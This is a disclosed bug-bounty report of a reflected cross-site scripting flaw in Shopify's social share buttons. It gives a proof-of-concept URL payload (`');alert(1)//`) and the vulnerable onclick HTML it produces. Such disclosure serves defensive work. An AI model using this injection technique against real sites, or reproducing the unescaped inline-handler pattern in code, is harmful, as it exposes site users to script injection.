@@ -1,0 +1,21 @@
+ReportLink:https://hackerone.com/reports/87168
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/reactors08
+ReportedTo:Shopify(shopify)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:21.10.2015 16:11:33
+
+Summary:
+
+social sharing buttons (facebook and linkedin) vulnerable to xss at `www.shopify.com/guides/*` `www.shopify.com/videos/*` and `www.shopify.com/success-stories/*`
+
+steps to reproduce:
+- go to page `https://www.shopify.com/videos/pop-up-shop?x=');alert(1)//`
+- share this page by clicking facebook or linkedin sharing button
+
+page contains malicious js:
+`<a class="icon social-shares__icon icon-facebook--square" onclick="window.open('http://facebook.com/sharer.php?u=https://www.shopify.com/videos/pop-up-shop?x=');alert(1)//','mywindow','width=500,height=400,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,copyhistory=no,resizable=yes'); return false;" href="http://facebook.com/sharer.php?u=https://www.shopify.com/videos/pop-up-shop?x=');alert(1)//','mywindow','width=500,height=400,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,copyhistory=no,resizable=yes" data-ga-event="Blog" data-ga-action="Facebook share">
+    <span class="visuallyhidden">Facebook</span>
+  </a>`
